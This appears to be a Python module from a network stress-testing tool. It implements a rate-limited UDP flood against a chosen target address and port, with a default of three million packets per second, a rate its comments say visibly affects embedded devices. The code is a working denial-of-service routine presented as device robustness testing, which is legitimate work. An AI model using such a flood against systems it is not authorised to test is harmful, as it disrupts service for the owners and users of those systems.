"""
測項：UDP Flood（通用任意 UDP Port）
分類：一般
實作：原生 Python socket，速率由 RateLimiter 控制（取代 hping3 --udp --flood 的無限全速）。
"""
import os
import socket
import time

from ..common import RateLimiter, clamp_duration

NAME = "UDP Flood"
CATEGORY = "一般"
PROTOCOL = "UDP"
TEST_TYPE = "traffic"  # 流量型：UDP 封包洪水，靠封包速率/頻寬本身造成負擔


def get_param_schema() -> dict:
    return {
        "rate_pps": {"type": "int", "default": 3000000, "min": 1, "max": 3000000, "desc": "每秒封包數（多數嵌入式裝置在此流量下已可觀察到明顯影響）"},
        "payload_size": {"type": "int", "default": 64, "min": 1, "max": 1400, "desc": "封包內容大小(bytes)"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_pps", 6000))
    size = int(params.get("payload_size", 64))
    payload = os.urandom(size)

    limiter = RateLimiter(rate)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent, errors = 0, 0
    start = time.time()

    log_fn(f"[+] UDP flood -> {target}:{port} @ {rate}pps, {duration}s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        try:
            sock.sendto(payload, (target, port))
            sent += 1
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}")
    sock.close()

    return {"packets_sent": sent, "errors": errors, "elapsed_sec": round(time.time() - start, 1)}
